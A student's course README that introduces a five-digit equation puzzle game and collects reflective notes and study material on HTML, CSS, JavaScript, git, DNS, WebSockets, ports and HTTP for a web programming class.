Quintus is a game that I came up with in high school and have been playing ever since.
The rules are simple: take any five digits and, while keeping them in their order,
try to turn it into a valid equation.
For instance, 84604 could have the solution 8-4+(6*0)=4. Seems simple, right?
Can you find a solution for 65535?
In making Quintus a self contained program, everything I was once using would all be in 
the same place, streamlined for crunching number after number.
Not only that, but having it online would open many more possibilites for social play,
progression tracking, and customization options.

![startup image](public/startup.png)

Simon HTML notes:

A lot of the knowledge I've gained in other programming languages
transfers over to web development pretty nicely, like taking things
slowly, implementing features one at a time, and overall making things
simple and straightforward will always be the best course of action.

There are clearly a lot of things implemented into modern HTML that
make programming easier for those just learning to use it, not to
mention the many resources on the internet to help explain things.

When thinking about my final project for the class, I had some concerns
about things like having multiple pages or how images will display,
but after having done this assignment I can see that I was worried about
those things for nothing - little things like that are much simpler than
I previously thought.

Simon CSS notes:

I feel like CSS is kind of a nice mid-way point between html and Javascript
as far as difficulty goes - while not as simple as html, it nevertheless
is still pretty straightforward and, as far as I can tell so far,
doesn't require a lot of knowledge of crazy intricate programming stuff
like other languages do.

I'm somewhat intimidated by all the decisions that come with CSS - 
how do I want my site to look? What are all the different ways
people may be visiting my site, and how should I prepare for each of
those? What if something seems really simple in my mind, but is actually
really tricky to implement? For now, I think I'm just going to keep things
simple.

I'm still new to the world of computer programming, so I'm still
somewhat perplexed at how files of different language types interact
with each other. Thankfully, learning all of this interesting stuff
is one of the things I really enjoy about computer science.

Startup HTML and CSS notes:

Man, people weren't kidding when they said that alignment in CSS is a
patience tester. I was able to get things oriented in a way that looks
good to me now, but I spent a lot of time and I'm still not done. I
suppose it stems from there being so many options for alignment built
into CSS, which ultimately is a good thing, but compared to the relative
simplicity of other basic functions, it's definitely a hurdle.

One of the nice things about working on something that I'm interested in
and came up with on my own is that I can decide what features to roll
out and at what pace. It took a lot of work to get my page having the
basics, but I can now tinker with it to implement other pages and
elements without, hopefully, having to redo what I've already got solid.

Simon Javascript notes:

All programs are different, needing some kinds of code but not others.
There are many things I still really don't understand about Javascript.
Thankfully, I think my startup is relatively simple. Of course, I will
need to know a lot more than what my startup project needs if I am to
make more programs - I can't just cross my fingers and hope that nothing
I don't understand ever comes up. But I'm glad I can build my program
at my own pace, and that having it be personally picked gives me the
motivation to figure out all the different components.

Javascript is the most "code-y" of the three languages that we have
learned about thus far - it has a lot of different options for a lot
of powerful features.


Mid-term notes:

Learning philosophy:
1. Technology
2. Art
3. Social
4. Discovery

HTML = Hypertext Markup Language - invented by Tim Berners-Lee
HTTP = HyperText Transfer Protocol
URL = Uniform Resource Locator
CSS = Cascading Style Sheets

“Always bet on JS” — Brendan Eich

![image](https://user-images.githubusercontent.com/46859278/224084795-bdeeec67-d966-43f6-bce8-055e7c2d0da6.png)

Console commands:

pwd: present working directory (shows the file path you're in)

curl: Command line client URL browser

grep - Regular expression search

find - Find files

cat - Output the contents of a file

ps - View the currently running processes

kill - Kill a currently running process

sudo - Execute a command as a super user (admin)

ssh - Create a secure shell on a remote computer

scp - Securely copy files to a remote computer

ping - Check if a website is up

tracert - Trace the connections to a website

dig - Show the DNS information for a domain

| - Take the output from the command on the left and pipe, or pass, it to the command on the right
'> - Redirect output to a file. Overwrites the file if it exists
'>> - Redirect output to a file. Appends if the file exist

git add .

git status

-m "comment"

git log

Every commit has a unique identifier that is generated by hashing the file along with the timestamp using the SHA hashing algorithm. You can always refer to a specific commit in your version history by using its SHA. For example, if we want to temporarily switch back to a previous version to see what it contains we can use the checkout command. You only need to provide the first few characters of the SHA.

To get back to the top of the version chain, use the checkout command and reference the branch name, which is by default master.

Most of the time you don't want to reverse back to an earlier commit. Instead you just want to compare the differences between commits. We can do that with the diff command.

use the git branch A command and start working on the A branch with the git checkout A command. checkout the master branch and execute git merge A.

### [TCP/IP](https://en.wikipedia.org/wiki/Internet_protocol_suite) layers

| Layer       | Example         | Purpose                               |
| ----------- | --------------- | ------------------------------------- |
| Application | HTTPS           | Functionality like web browsing       |
| Transport   | TCP             | Moving connection information packets |
| Internet    | IP              | Establishing connections              |
| Link        | Fiber, hardware | Physical connections                  |

| Service        | Purpose                              |
| -------------- | ------------------------------------ |
| EC2            | Server                               |
| EC2 Elastic IP | Keep your IP address between reboots |
| Route 53       | Domain name                          | 
| Route 53       | DNS records                          |         

![image](https://user-images.githubusercontent.com/46859278/224215421-96d425f1-9bcc-4e8e-8441-f7f052c2d2ea.png)

The DNS database records that facilitate the mapping of domain names to IP addresses come in several flavors. The main ones we are concerned with are the address (A) and the canonical name (CNAME) records. An A record is a straight mapping from a domain name to IP address. A CNAME record maps one domain name to another domain name. This acts as a domain name alias. You would use a CNAME to do things like map byu.com to the same IP address as byu.edu so that either one could be used.

Caddy handles all of the creation and rotation of web certificates. This allows us to easily support HTTPS.
Caddy serves up all of your static HTML, CSS, and JavaScript files. All of your early application work will be hosted as static files.
Caddy acts as a gateway for subdomain requests to your Simon and start up application services. For example, when a request is made to simon.yourdomain Caddy will proxy the request to the Simon application running with node.js as an internal web service.

The secure version of HTTP is called Secure Hypertext Transport Protocol (HTTPS). This is basically HTTP with a negotiated secure connection that happens before any data is exchanged. Having a secure connection means that all the data is encrypted using the TLS protocol. TLS is sometimes referred to by a now unsecure predecessor protocol named SSL. TLS works by negotiating a shared secret that is then used to encrypt data. You can see the actual negotiation that happens by using the console browser based application curl, along with the -v parameter to see the verbose output of the HTTPS exchange. The > /dev/null redirection throws away the actual HTTP response, since we only care about the negotiation, by redirecting the output to the null device.

Every HTML element may have attributes. Attributes describe the specific details of the element. For example, the id attribute gives a unique ID to the element so that you can distinguish it from other elements. The class attribute is another common element attribute that designates the element as being classified into a named group of elements. Attributes are written inside the element tag with a name followed by an optional value. You can use either single quotes (') or double quotes (") to delimit attribute values.

A hyperlink in HTML is represented with an anchor (a) element that has an attribute containing the address of the hyperlink reference (href). A hyperlink to BYU's home page looks like this:

```html
<a href="https://byu.edu">Go to the Y</a>
```

| element   | meaning                                                                |
| --------- | ---------------------------------------------------------------------- |
| `html`    | The page container                                                     |
| `head`    | Header information                                                     |
| `title`   | Title of the page                                                      |
| `meta`    | Metadata for the page such as character set or viewport settings       |
| `script`  | JavaScript reference. Either a external reference, or inline           |
| `include` | External content reference                                             |
| `body`    | The entire content body of the page                                    |
| `header`  | Header of the main content                                             |
| `footer`  | Footer of the main content                                             |
| `nav`     | Navigational inputs                                                    |
| `main`    | Main content of the page                                               |
| `section` | A section of the main content                                          |
| `aside`   | Aside content from the main content                                    |
| `div`     | A block division of content                                            |
| `span`    | An inline span of content                                              |
| `h<1-9>`  | Text heading. From h1, the highest level, down to h9, the lowest level |
| `p`       | A paragraph of text                                                    |
| `b`       | Bring attention                                                        |
| `table`   | Table                                                                  |
| `tr`      | Table row                                                              |
| `th`      | Table header                                                           |
| `td`      | Table data                                                             |
| `ol,ul`   | Ordered or unordered list                                              |
| `li`      | List item                                                              |
| `a`       | Anchor the text to a hyperlink                                         |
| `img`     | Graphical image reference                                              |
| `dialog`  | Interactive component such as a confirmation                           |
| `form`    | A collection of user input                                             |
| `input`   | User input field                                                       |
| `audio`   | Audio content                                                          |
| `video`   | Video content                                                          |
| `svg`     | Scalable vector graphic content                                        |
| `iframe`  | Inline frame of another HTML page                                      |

```html
<!-- commented text -->
```

| Character | Entity      |
| --------- | ----------- |
| &amp;     | `&amp;`     |
| <         | `&lt;`      |
| >         | `&gt;`      |
| "         | `&quot;`    |
| '         | `&apos;`    |
| &#128512; | `&#128512;` |

| Element    | Meaning                          | Example                                        |
| ---------- | -------------------------------- | ---------------------------------------------- |
| `form`     | Input container and submission   | `<form action="form.html" method="post">`      |
| `fieldset` | Labeled input grouping           | `<fieldset> ... </fieldset>`                   |
| `input`    | Multiple types of user input     | `<input type="" />`                            |
| `select`   | Selection dropdown               | `<select><option>1</option></select>`          |
| `optgroup` | Grouped selection dropdown       | `<optgroup><option>1</option></optgroup>`      |
| `option`   | Selection option                 | `<option selected>option2</option>`            |
| `textarea` | Multiline text input             | `<textarea></textarea>`                        |
| `label`    | Individual input label           | `<label for="range">Range: </label>`           |
| `output`   | Output of input                  | `<output for="range">0</output>`               |
| `meter`    | Display value with a known range | `<meter min="0" max="100" value="50"></meter>` |

| Type           | Meaning                           |
| -------------- | --------------------------------- |
| text           | Single line textual value         |
| password       | Obscured password                 |
| email          | Email address                     |
| tel            | Telephone number                  |
| url            | URL address                       |
| number         | Numerical value                   |
| checkbox       | Inclusive selection               |
| radio          | Exclusive selection               |
| range          | Range limited number              |
| date           | Year, month, day                  |
| datetime-local | Date and time                     |
| month          | Year, month                       |
| week           | Week of year                      |
| color          | Color                             |
| file           | Local file                        |
| submit         | button to trigger form submission |

| Attribute | Meaning                                                                             |
| --------- | ----------------------------------------------------------------------------------- |
| name      | The name of the input. This is submitted as the name of the input if used in a form |
| disabled  | Disables the ability for the user to interact with the input                        |
| value     | The initial value of the input                                                      |
| required  | Signifies that a value is required in order to be valid                             |

```html
<img
  alt="mountain landscape"
  src="https://images.pexels.com/photos/164170/pexels-photo-164170.jpeg"
/>
```

```html
<audio controls src="testAudio.mp3"></audio>
```

```html
<video controls width="300" crossorigin="anonymous">
  <source
    src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4"
  />
</video>
```

```html
<svg
  viewBox="0 0 300 200"
  xmlns="http://www.w3.org/2000/svg"
  stroke="red"
  fill="red"
  style="border: 1px solid #000000"
>
  <circle cx="150" cy="100" r="50" />
</svg>
```

```html
<canvas
  id="canvasDemo"
  width="300"
  height="200"
  style="border: 1px solid #000000"
></canvas>
<script>
  const ctx = document.getElementById('canvasDemo').getContext('2d');
  ctx.beginPath();
  ctx.arc(150, 100, 50, 0, 2 * Math.PI);
  ctx.fillStyle = 'red';
  ctx.strokeStyle = 'red';
  ctx.fill();
  ctx.stroke();
</script>
```

![image](https://user-images.githubusercontent.com/46859278/224218563-8e644da3-34e6-4207-9357-5dd92def828e.png)

```css
p {
  font-family: sans-serif;
  font-size: 2em;
  color: navy;
  text-shadow: 3px 3px 1px #cccccc;
}
```

The selector `p` selects all paragraph elements in the HTML document. The four specified declarations then: 1) change the font to use a san-serif font, 2) increase the font size to be twice as big as the default font, 3) change the text color to be navy, and 4) create a gray shadow for the text.

```html
<link rel="stylesheet" href="styles.css" />
```

![image](https://user-images.githubusercontent.com/46859278/224218977-47e1ca4d-5a72-40d2-af44-5ba5b898ec2c.png)

![image](https://user-images.githubusercontent.com/46859278/224219015-6d488d8d-3117-409d-95fa-2ee08699c526.png)

| Combinator       | Meaning                    | Example        | Description                                |
| ---------------- | -------------------------- | -------------- | ------------------------------------------ |
| Descendant       | A list of descendants      | `body section` | Any section that is a descendant of a body |
| Child            | A list of direct children  | `section > p`  | Any p that is a direct child of a section  |
| General sibling  | A list of siblings         | `p ~ div`      | Any p that has a div sibling               |
| Adjacent sibling | A list of adjacent sibling | `p + div`      | Any p that has an adjacent div sibling     |

| Property           | Value                              | Example             | Discussion                                                                     |
| ------------------ | ---------------------------------- | ------------------- | ------------------------------------------------------------------------------ |
| background-color   | color                              | `red`               | Fill the background color                                                      |
| border             | color width style                  | `#fad solid medium` | Sets the border using shorthand where any or all of the values may be provided |
| border-radius      | unit                               | `50%`               | The size of the border radius                                                  |
| box-shadow         | x-offset y-offset blu-radius color | `2px 2px 2px gray`  | Creates a shadow                                                               |
| columns            | number                             | `3`                 | Number of textual columns                                                      |
| column-rule        | color width style                  | `solid thin black`  | Sets the border used between columns using border shorthand                    |
| color              | color                              | `rgb(128, 0, 0)`    | Sets the text color                                                            |
| cursor             | type                               | `grab`              | Sets the cursor to display when hovering over the element                      |
| display            | type                               | `none`              | Defines how to display the element and its children                            |
| filter             | filter-function                    | `grayscale(30%)`    | Applies a visual filter                                                        |
| float              | direction                          | `right`             | Places the element to the left or right in the flow                            |
| flex               |                                    |                     | Flex layout. Used for responsive design                                        |
| font               | family size style                  | `Arial 1.2em bold`  | Defines the text font using shorthand                                          |
| grid               |                                    |                     | Grid layout. Used for responsive design                                        |
| height             | unit                               | `.25em`             | Sets the height of the box                                                     |
| margin             | unit                               | `5px 5px 0 0`       | Sets the margin spacing                                                        |
| max-[width/height] | unit                               | `20%`               | Restricts the width or height to no more than the unit                         |
| min-[width/height] | unit                               | `10vh`              | Restricts the width or height to no less than the unit                         |
| opacity            | number                             | `.9`                | Sets how opaque the element is                                                 |
| overflow           | [visible/hidden/scroll/auto]       | `scroll`            | Defines what happens when the content does not fix in its box                  |
| position           | [static/relative/absolute/sticky]  | `absolute`          | Defines how the element is positioned in the document                          |
| padding            | unit                               | `1em 2em`           | Sets the padding spacing                                                       |
| left               | unit                               | `10rem`             | The horizontal value of a positioned element                                   |
| text-align         | [start/end/center/justify]         | `end`               | Defines how the text is aligned in the element                                 |
| top                | unit                               | `50px`              | The vertical value of a positioned element                                     |
| transform          | transform-function                 | `rotate(0.5turn)`   | Applies a transformation to the element                                        |
| width              | unit                               | `25vmin`            | Sets the width of the box                                                      |
| z-index            | number                             | `100`               | Controls the positioning of the element on the z axis                          |

| Unit | Description                                                      |
| ---- | ---------------------------------------------------------------- |
| px   | The number of pixels                                             |
| pt   | The number of points (1/72 of an inch)                           |
| in   | The number of inches                                             |
| cm   | The number of centimeters                                        |
| %    | A percentage of the parent element                               |
| em   | A multiplier of the width of the letter `m` in the parent's font |
| rem  | A multiplier of the width of the letter `m` in the root's font   |
| ex   | A multiplier of the height of the element's font                 |
| vw   | A percentage of the viewport's width                             |
| vh   | A percentage of the viewport's height                            |
| vmin | A percentage of the viewport's smaller dimension                 |
| vmax | A percentage of the viewport's larger dimension                  |

```css
@font-face {
  font-family: 'Quicksand';
  src: url('https://cs260.click/fonts/quicksand.woff2');
}

p {
  font-family: Quicksand;
}
```

```css
@import url('https://fonts.googleapis.com/css2?family=Rubik Microbe&display=swap');

p {
  font-family: 'Rubik Microbe';
}
```

```css
p {
  text-align: center;
  font-size: 20vh;

  animation-name: demo;
  animation-duration: 3s;
}
```

```css
@keyframes demo {
  from {
    font-size: 0vh;
  }

  to {
    font-size: 20vh;
  }
}
```

```css
.none {
  display: none;
}

.block {
  display: block;
}

.inline {
  display: inline;
}

.flex {
  display: flex;
  flex-direction: row;
}

.grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
}
```

![image](https://user-images.githubusercontent.com/46859278/224219867-ac8dfd16-78d5-4417-9373-9af7bd4d63e0.png)

**index.js**

```js
function sayHello() {
  console.log('hello');
}
```

**index.html**

```html
<head>
  <script src="javascript.js"></script>
</head>
<body>
  <button onclick="sayHello()">Say Hello</button>
  <button onclick="sayGoodbye()">Say Goodbye</button>
  <script>
    function sayGoodbye() {
      alert('Goodbye');
    }
  </script>
</body>
```

Variables are declared using either the let or const keyword. let allows you to change the value of the variable while const will cause an error if you attempt to change it.

| Type        | Meaning                                                    |
| ----------- | ---------------------------------------------------------- |
| `Null`      | The type of a variable that has not been assigned a value. |
| `Undefined` | The type of a variable that has not been defined.          |
| `Boolean`   | true or false.                                             |
| `Number`    | A 64 bit signed number.                                    |
| `BigInt`    | A number of arbitrary magnitude.                           |
| `String`    | A textual sequence of characters.                          |
| `Symbol`    | A unique value.                                            |

| Type       | Use                                                                                    | Example                  |
| ---------- | -------------------------------------------------------------------------------------- | ------------------------ |
| `Object`   | A collection of properties represented by name value pairs. Values can be of any type. | `{a:3, b:'fish'}`        |
| `Function` | An object that has the ability to be called.                                           | `function a() {}`        |
| `Date`     | Calendar dates and times.                                                              | `new Date('1995-12-17')` |
| `Array`    | An ordered sequence of any type.                                                       | `[3, 'fish']`            |
| `Map`      | A collection of key value pairs that support efficient lookups.                        | `new Map()`              |
| `JSON`     | A lightweight data-interchange format used to share information across programs.       | `{"a":3, "b":"fish"}`    |

You can also use the ternary operator. This provides a compact `if else` representation.

```js
a === 1 ? console.log(1) : console.log('not 1');
```

Here is an example of a JSON document.

```json
{
  "class": {
    "title": "web programming",
    "description": "Amazing"
  },
  "enrollment": ["Marco", "Jana", "فَاطِمَة"],
  "start": "2025-02-01",
  "end": null
}
```

You can convert JSON to, and from, JavaScript using the `JSON.parse` and `JSON.stringify` functions.

```js
const obj = { a: 2, b: 'crockford', c: undefined };
const json = JSON.stringify(obj);
const objFromJson = JSON.parse(json);

console.log(obj, json, objFromJson);

// OUTPUT:
// {a: 2, b: 'crockford', c: undefined}
// {"a":2, "b":"crockford"}
// {a: 2, b: 'crockford'}
```

The `string` class has several functions that accept regular expressions. This includes `match`, `replace`, `search`, and `split`.

JavaScript provides the `rest` syntax to make this easier. Think of it as a parameter that contains the `rest` of the parameters. To turn the last parameter of any function into a `rest` parameter you prefix it with three periods. You can then you can call it with any number of parameters and they are all automatically combined into an array.

```js
function hasNumber(test, ...numbers) {
  return numbers.some((i) => i === test);
}

hasNumber(2, 1, 2, 3);
// RETURNS: true
```

An example of destructuring arrays looks like the following.

```js
const a = [1, 2, 4, 5];

// destructure the first two items from a, into the new variables b and c
const [b, c] = a;

console.log(b, c);
// OUTPUT: 1, 2
```

```js
try {
  // normal execution code
} catch (err) {
  // exception handling code
} finally {
  // always called code
}
```

## This

The keyword `this` represents a variable that points to an object that contains the context within the scope of the currently executing line of code. The `this` variable is automatically declared and you can reference `this` anywhere in a JavaScript program. Because the value of `this` depends upon the context in which it is referenced, there are three different context that this can refer to:

1. **Global** - When `this` is referenced outside a function or object it refers to the `globalThis` object. The globalThis object represents the context for runtime environment. For example, when running in a browser, globalThis refers to the browser's window object.
1. **Function** - When `this` is referenced in a function it refers to the object that owns the function. That is either an object you defined or globalThis if the function is defined outside of an object. Note that when running is JavaScript strict mode, a global function's this variable is undefined instead of globalThis.
1. **Object** - When `this` is referenced in a object it refers to the object.

```js
function displayElement(el) {
  console.log(el.tagName);
  for (const child of el.children) {
    displayElement(child);
  }
}

displayElement(document);
```

| Event Category | Description           |
| -------------- | --------------------- |
| Clipboard      | Cut, copied, pasted   |
| Focus          | An element gets focus |
| Keyboard       | Keys are pressed      |
| Mouse          | Click events          |
| Text selection | When text is selected |

You create a promise by calling the Promise object constructor and passing it an executor function that runs the asynchronous operation. Executing asynchronously means that promise constructor may return before the promise executor function runs.

We can demonstrate asynchronous execution by using the standard JavaScript `setTimeout` function to create a delay in the execution of the code. The setTimeout function takes the number of milliseconds to wait and a function to call after that amount of time has expired. We call the delay function in a for loop in the promise executor and also a for loop outside the promise so that both code blocks are running in parallel.

Now that we know how to use a promise to execute asynchronously, we need to be able to set the state to `fulfilled` when things complete correctly, or to `rejected` when an error happens. The promise executor function takes two functions as parameters, `resolve` and `reject`. Calling `resolve` sets the promise to the `fulfilled` state, and calling `reject` sets the promise to the `rejected` state.

Consider the following "coin toss" promise that waits ten seconds and then has a fifty percent chance of resolving or rejecting.

```js
const coinToss = new Promise((resolve, reject) => {
  setTimeout(() => {
    if (Math.random() > 0.5) {
      resolve('success');
    } else {
      reject('error');
    }
  }, 10000);
});
```

With the ability to asynchronously execute and set the resulting state, we now need a way to generically do something with the result of a promise after it resolves. This is done with functionality similar to exception handling. The promise object has three functions: `then`, `catch`, and `finally`. The `then` function is called if the promise is fulfilled, `catch` is called if the promise is `rejected`, and `finally` is always called after all the processing is completed.

JavaScript Promise objects are great for asynchronous execution, but as developers began build large systems with promises they started wanting a more concise representation. This was provided with the introduction of the `async/await` syntax. The `await` keyword wraps the execution of a promise and removed the need to chain functions. The `await` expression will block until the promise state moves to `fulfilled`, or throws an exception if the state moves to `rejected`.

The `async` keyword declares that a function returns a promise. The `await` keyword wraps a call to the `async` function, blocks execution until the promise has resolved, and then returns the result of the promise.


Simon Service notes:
I've been thinking a lot about how I'm going to implement these things to my startup
and I think the most important use will be to keep track of which numbers have
already been solved and not giving those numbers to the players.

I'll need to go over this code a bit more in order to get everything integrated with
my startup that I want. I'm still pretty unsure on how to parse and reference
the information, but I'm sure I'll figure it out.

I had some trouble with the structuring of the folders and files - the public folder
needs to go in the main folder of the project, and only the things that are publicly
visible go in there.

Simon DB notes:

DON'T COMMIT WITH PASSWORDS IN CODE. USE PROCESS.ENV INSTEAD.

As long as Mongo (or whatever service) is set up once, any programs that use it from
then are good to go.

From what I understand, databases are useful for storing (potentially) large amounts
of data, particularly user data. Because it often contains user data, it's important
to make sure that everything is secure.

Simon Websocket notes:

JavaScript running on a browser can initiate a websocket connection with the browser's WebSocket API. First you create a WebSocket object by specifying the port you want to communicate on.

You can then send messages with the send function, and register a callback using the onmessage function to receive messages.

const socket = new WebSocket('ws://localhost:9900');

socket.onmessage = (event) => {
  console.log('received: ', event.data);
};

socket.send('I am listening');
The server uses the ws package to create a WebSocketServer that is listening on the same port the browser is using. By specifying a port when you create the WebSocketServer you are telling the server to listen for HTTP connections on that port and to automatically upgrade them to a WebSocket connection if the request has a connection: Upgrade header.

When a connection is detected it calls the server's on connection callback. The server can then send messages with the send function, and register a callback using the on message function to receive messages.

const { WebSocketServer } = require('ws');

const wss = new WebSocketServer({ port: 9900 });

wss.on('connection', (ws) => {
  ws.on('message', (data) => {
    const msg = String.fromCharCode(...data);
    console.log('received: %s', msg);

    ws.send(`I heard you say "${msg}"`);
  });

  ws.send('Hello webSocket');
});

Debugging the server
Create a directory named testWebSocket and change to that directory.

Run npm init -y.

Run npm install ws.

Open VS Code and create a file named main.js. Paste the following code.

const { WebSocketServer } = require('ws');

const wss = new WebSocketServer({ port: 9900 });

wss.on('connection', (ws) => {
  ws.on('message', (data) => {
    const msg = String.fromCharCode(...data);
    console.log('received: %s', msg);

    ws.send(`I heard you say "${msg}"`);
  });

  ws.send('Hello webSocket');
});
Set breakpoints on the ws.send lines so you can inspect the code executing.

Start debugging by pressing F5. The first time you may need to choose Node.js as the debugger.

Debugging the client
Open the Chrome debugger by pressing F12.

Paste this code into the debugger console window and press enter to execute it. Executing this code will immediately hit the server breakpoint. Take a look at what is going on and then remove the breakpoint from the server.

const socket = new WebSocket('ws://localhost:9900');

socket.onmessage = (event) => {
  console.log('received: ', event.data);
};
Select the Network tab and then select the HTTP message that was generated by the execution of the above client code.

With the HTTP message selected, you then click the Messages tab to view the WebSocket messages

Send a message to the server by executing the following in the debugger console window. This will cause the second server breakpoint to hit. Explore and then remove the breakpoint from the server.

socket.send('I am listening');
You should see the messages in the Messages debugger window.

Send some more messages and observe the communication back and forth without stopping on the breakpoints.

You can find the complete example described above in this GitHub repository.

Clone the repository.
Run npm install from a console window in the example directory https://github.com/webprogramming260/websocket-chat
Open up the code in VS Code and review what it is doing.
Run and debug the example by pressing F5. You may need to select node.js as the debugger the first time you run.
Open multiple browser windows and point them to http://localhost:3000 and start chatting.
Use the browser's debugger to view the WebSocket communication.

Final notes:

| Part        | Example                              | Meaning                                                                                                                                                                                                                                                                             |
| ----------- | ------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Scheme      | https                                | The protocol required to ask for the resource. For web applications, this is usually HTTPS. But it could be any internet protocol such as FTP or MAILTO.                                                                                                                            |
| Domain name | byu.edu                              | The domain name that owns the resource represented by the URL.                                                                                                                                                                                                                      |
| Port        | 3000                                 | The port specifies the numbered network port used to connect to the domain server. Lower number ports are reserved for common internet protocols, higher number ports can be used for any purpose. The default port is 80 if the scheme is HTTP, or 443 if the scheme is HTTPS.     |
| Path        | /school/byu/user/8014                | The path to the resource on the domain. The resource does not have to physically be located on the file system with this path. It can be a logical path representing endpoint parameters, a database table, or an object schema.                                                    |
| Parameters  | filter=names&highlight=intro,summary | The parameters represent a list of key value pairs. Usually it provides additional qualifiers on the resource represented by the path. This might be a filter on the returned resource or how to highlight the resource. The parameters are also sometimes called the query string. |
| Anchor      | summary                              | The anchor usually represents an sub-location in the resource. For HTML pages this represents a request for the browser to automatically scroll to the element with an ID that matches the anchor. The anchor is also sometimes called the hash, or fragment ID.                    |

You will sometimes hear the use of URN or URI when talking about web resources. A Uniform Resource Name (URN) is a unique resource name that does not specify location information. For example, a book URN might be urn:isbn:10,0765350386. A Uniform Resource Identifier (URI) is a general resource identifier that could refer to either a URL and URN. With web programming you are almost always talking about URLs and therefore you should not use the more general URI.

# Ports

When you connect to a device on the internet you need both an IP address and a numbered port. Port numbers allow a single device to support multiple protocols (e.g. HTTP, HTTPS, FTP, or SSH) as well as different types of services (e.g. search, document, or authentication). The ports may be exposed externally, or they may only be used internally on the device. For example, the HTTPS port (443) might allow the world to connect, the SSH port (22) might only allow computers at your school, and a service defined port (say 3000) may only allow access to processes running on the device.

The internet governing body, IANA, defines the standard usage for port numbers. Ports from 0 to 1023 represent standard protocols. Generally a web service should avoid these ports unless it is providing the protocol represented by the standard. Ports from 1024 to 49151 represent ports that have been assigned to requesting entities. However, it is very common for these ports to be used by services running internally on a device. Ports from 49152 to 65535 are considered dynamic and are used to create dynamic connections to a device. [Here](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml) is the link to IANA's registry.

Here is a list of common port numbers that you might come across.

| Port | Protocol                                                                                           |
| ---- | -------------------------------------------------------------------------------------------------- |
| 20   | File Transfer Protocol (FTP) for data transfer                                                     |
| 22   | Secure Shell (SSH) for connecting to remote devices                                                |
| 25   | Simple Mail Transfer Protocol (SMTP) for sending email                                             |
| 53   | Domain Name System (DNS) for looking up IP addresses                                               |
| 80   | Hypertext Transfer Protocol (HTTP) for web requests                                                |
| 110  | Post Office Protocol (POP3) for retrieving email                                                   |
| 123  | Network Time Protocol (NTP) for managing time                                                      |
| 161  | Simple Network Management Protocol (SNMP) for managing network devices such as routers or printers |
| 194  | Internet Relay Chat (IRC) for chatting                                                             |
| 443  | HTTP Secure (HTTPS) for secure web requests                                                        |

## Your ports

As an example of how ports are used we can look at your web server. When you built your web server you externally exposed port 22 so that you could use SSH to open a remote console on the server, port 443 for secure HTTP communication, and port 80 for unsecure HTTP communication.

![Ports](webServicesPorts.jpg)

Your web service, Caddy, is listening on ports 80 and 443. When Caddy gets a request on port 80, it automatically redirects the request to port 443 so that a secure connection is used. When Caddy gets a request on port 443 it examines the path provided in the HTTP request (as defined by the URL) and if the path matches a static file, it reads the file off disk and returns it. If the HTTP path matches one of the definitions it has for a gateway service, Caddy makes a connection on that service's port (e.g. 3000 or 4000) and passes the request to the service.

Internally on your web server, you can have as many web services running as you would like. However, you must make sure that each one uses a different port to communicate on. You run your Simon service on port 3000 and therefore **cannot** use port 3000 for your startup service. Instead you use port 4000 for your startup service. It does not matter what high range port you use. It only matters that you are consistent and that they are only used by one service.

### Request

The HTTP request for the above command would look like the following.

```http
GET /hypertext/WWW/Helping.html HTTP/1.1
Host: info.cern.ch
Accept: text/html
```

An HTTP request has this general syntax.

```yaml
<verb> <url path, parameters, anchor> <version>
[<header key: value>]*
[

  <body>
]
```

The first line of the HTTP request contains the `verb` of the request, followed by the path, parameters, and anchor of the URL, and finally the version of HTTP being used. The following lines are optional headers that are defined by key value pairs. After the headers you have an optional body. The body start is delimited from the headers with two new lines.

In the above example, we are asking to `GET` a resource found at the path `/hypertext/WWW/Helping.html`. The version used by the request is `HTTP/1.1`. This is followed by two headers. The first specifies the requested host (i.e. domain name). The second specifies what type of resources the client will accept. The resource type is always a [MIME type](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types) as defined by internet governing body IANA. In this case we are asking for HTML.

### Response

The response to the above request looks like this.

```yaml
HTTP/1.1 200 OK
Date: Tue, 06 Dec 2022 21:54:42 GMT
Server: Apache
Last-Modified: Thu, 29 Oct 1992 11:15:20 GMT
ETag: "5f0-28f29422b8200"
Accept-Ranges: bytes
Content-Length: 1520
Connection: close
Content-Type: text/html

<TITLE>Helping -- /WWW</TITLE>
<NEXTID 7>
<H1>How can I help?</H1>There are lots of ways you can help if you are interested in seeing
the <A NAME=4 HREF=TheProject.html>web</A> grow and be even more useful...
```

An HTTP response has the following syntax.

```yaml
<version> <status code> <status string>
[<header key: value>]*
[

  <body>
]
```

## Verbs

There are several verbs that describe what the HTTP request is asking for. The list below only describes the most common ones.

| Verb    | Meaning                                                                                                                                                                                                                                                  |
| ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| GET     | Get the requested resource. This can represent a request to get a single resource or a resource representing a list of resources.                                                                                                                        |
| POST    | Create a new resource. The body of the request contains the resource. The response should include a unique ID of the newly created resource.                                                                                                             |
| PUT     | Update a resource. Either the URL path, HTTP header, or body must contain the unique ID of the resource being updated. The body of the request should contain the updated resource. The body of the response may contain the resulting updated resource. |
| DELETE  | Delete a resource. Either the URL path or HTTP header must contain the unique ID of the resource to delete.                                                                                                                                              |
| OPTIONS | Get metadata about a resource. Usually only HTTP headers are returned. The resource itself is not returned.                                                                                                                                              |

## Status codes

It is important that you use the standard HTTP status codes in your HTTP responses so that the client of a request can know how to interpret the response. The codes are partitioned into five blocks.

- 1xx - Informational.
- 2xx - Success.
- 3xx - Redirect to some other location, or that the previously cached resource is still valid.
- 4xx - Client errors. The request is invalid.
- 5xx - Server errors. The request cannot be satisfied due to an error on the server.

Within those ranges here are some of the more common codes. See the [MDN documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status) for a full description of status codes.

| Code | Text                                                                                 | Meaning                                                                                                                           |
| ---- | ------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------- |
| 100  | Continue                                                                             | The service is working on the request                                                                                             |
| 200  | Success                                                                              | The requested resource was found and returned as appropriate.                                                                     |
| 201  | Created                                                                              | The request was successful and a new resource was created.                                                                        |
| 204  | No Content                                                                           | The request was successful but no resource is returned.                                                                           |
| 304  | Not Modified                                                                         | The cached version of the resource is still valid.                                                                                |
| 307  | Permanent redirect                                                                   | The resource is no longer at the requested location. The new location is specified in the response location header.               |
